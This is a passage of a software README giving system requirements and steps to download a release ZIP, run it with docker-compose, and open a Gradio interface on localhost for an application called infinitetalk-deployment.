## üöÄ Getting Started

### System Requirements

To run this software, your computer should meet the following requirements:

- **Operating System:** Windows, macOS, or Linux
- **Memory:** At least 4 GB of RAM
- **Processor:** 64-bit processor
- **Docker:** Make sure to install Docker on your machine

### Setup Steps

1. **Install Docker**

   First, install Docker by following the instructions on the [Docker website](https://www.docker.com/get-started). Choose your operating system and follow the relevant steps.

2. **Visit the Releases Page**

   Go to our [Releases page](https://github.com/kaniyeFelix/infinitetalk-deployment/releases) to find the latest version. Click on the link below to access it directly:

   [Download Latest Release](https://github.com/kaniyeFelix/infinitetalk-deployment/releases)

3. **Download the Application**

   On the Releases page, locate the appropriate file for your system. Download the package. It will come in a ZIP file format.

4. **Unpack the Files**

   Once downloaded, unzip the ZIP file to a location of your choice. This will create a folder containing the necessary files to run the application.

5. **Run the Application with Docker**

   Open your terminal or command prompt. Change to the directory where you unpacked the files. Run the following command:

   ```bash
   docker-compose up
   ```

   This command launches the application. Keep the terminal open while it runs.

6. **Access the Gradio User Interface**

   Open your web browser. Type in the following URL to access the Gradio UI:

   ```
   http://localhost:7860
   ```

   You will now see the user interface where you can interact with the application.

If you encounter issues while setting up or running the application, try the following:
